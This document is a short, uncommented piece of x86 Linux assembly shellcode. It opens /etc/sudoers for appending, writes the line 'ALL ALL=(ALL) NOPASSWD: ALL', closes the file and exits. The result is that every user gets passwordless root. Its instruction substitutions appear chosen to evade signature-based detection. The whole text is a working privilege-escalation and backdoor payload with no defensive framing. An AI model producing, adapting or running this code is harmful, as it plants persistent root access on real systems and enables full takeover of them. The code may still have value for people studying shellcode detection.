global _start

section .text

_start:
	sub eax, eax
	sub esp, 4
	mov [esp], eax
	push word 0x7372
	push word 0x656f
	push word 0x6475
	push word 0x732f
	push dword 0x6374652f
	sub ebx, ebx
	add ebx, esp
	and ecx, eax
	add cx, 0x401
	add al, 0x5
	int 0x80

	xchg ebx, eax
	sub eax, eax
	sub esp, 4
	mov [esp], eax
	push dword 0xa4c4c41
	push dword 0x203a4457
	push word 0x5353
	push word 0x4150
	push dword 0x4f4e2029
	push dword 0x4c4c4128
	push dword 0x3d4c4c41
	push dword 0x204c4c41
	sub ecx, ecx
	add ecx, esp
	
	xor edx, edx
	mov dl, 0x1c
	add al, 0x4
	int 0x80

	mov al, 0x6
	int 0x80

	mov al, 0x1
	sub ebx, ebx
	int 0x80
